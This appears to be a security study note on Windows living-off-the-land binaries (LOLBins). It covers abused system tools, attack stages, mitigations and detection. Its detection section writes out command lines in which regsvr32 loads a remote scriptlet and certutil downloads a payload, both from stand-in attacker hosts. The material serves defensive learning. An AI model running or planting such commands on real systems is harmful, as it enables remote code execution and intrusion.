**LOLBins** are legitimate binaries that exist by default on Windows systems and can be exploited by attackers to perform malicious actions — often without dropping additional files. This technique falls under **living off the land (LOTL)** attacks, commonly used in fileless malware and post-exploitation phases.

---

## 🧠 Why LOLBins Matter

- **Trusted by the system** — often signed and whitelisted
- **Pre-installed** — no need to upload external tools
- **Abuse system functionality** — allows code execution, data exfiltration, persistence, and more
- **Used to bypass** EDR/AV, application whitelisting, and other controls

---

## 🔍 Common LOLBins

| Binary         | Abuse Function                                  | Example Use Case                                      |
|----------------|--------------------------------------------------|--------------------------------------------------------|
| `powershell.exe` | Code execution, downloading scripts             | Download & execute payload from memory                |
| `cmd.exe`        | Execute batch commands                          | Launch persistence scripts                            |
| `wmic.exe`       | Execute WMI queries, spawn processes            | Stealthy process execution                            |
| `rundll32.exe`   | Execute DLL functions                           | Load malicious DLL from memory                        |
| `regsvr32.exe`   | Register/unregister DLLs, script execution      | Load remote scriptlet (.sct) file                     |
| `mshta.exe`      | Execute HTA (HTML Application) code             | Execute script embedded in HTML                       |
| `certutil.exe`   | Encode/decode files, download via HTTP          | Base64 encode malware or download tools               |
| `bitsadmin.exe`  | Transfer files over HTTP/HTTPS                  | Download payloads                                     |
| `forfiles.exe`   | Run commands on files                           | Scheduled persistence                                 |
| `schtasks.exe`   | Schedule tasks                                  | Maintain persistence                                  |

---

## ⚔️ Threat Use Cases

- **Initial Access**: Macro executes PowerShell script using `cmd.exe`
- **Execution**: Payload run via `rundll32.exe`
- **Persistence**: Scheduled task via `schtasks.exe`
- **Defense Evasion**: Uses `regsvr32.exe` to run scriptlets bypassing policy
- **Exfiltration**: Data encoded with `certutil` and sent over HTTP

---

## 🛡️ Mitigation Techniques

| Control Type       | Examples                                                                |
|--------------------|-------------------------------------------------------------------------|
| **Preventive**     | Application whitelisting (e.g., AppLocker, WDAC), remove unused tools   |
| **Detective**      | Monitor command-line parameters and parent-child process chains         |
| **Corrective**     | Kill suspicious processes, isolate system, reimage                      |
| **Compensating**   | Use PowerShell Constrained Language Mode, enforce least privilege       |

---

## 🧪 Detection Examples

- `powershell.exe -EncodedCommand ...`
- `regsvr32.exe /s /n /u /i:http://attacker/script.sct scrobj.dll`
- `certutil.exe -urlcache -split -f http://malicious.com/payload.exe`

---

## 📚 Additional Notes

- These binaries are part of trusted processes — usage context is critical.
- Attacks often chain multiple LOLBins for evasion and functionality.
- Detection relies on **behavioral analytics** rather than signature-based AV.

---

## 🔗 Related Topics

- [[Fileless Malware]]
- [[PowerShell Attacks]]
- [[Process Injection]]
- [[Persistence Techniques]]
- [[Security Information & Event Management (SIEM)]]

---

## 🏷 Tags

#LOLBins #LOTL #living_off_the_land #fileless_malware #powershell #defense_evasion #windows_security
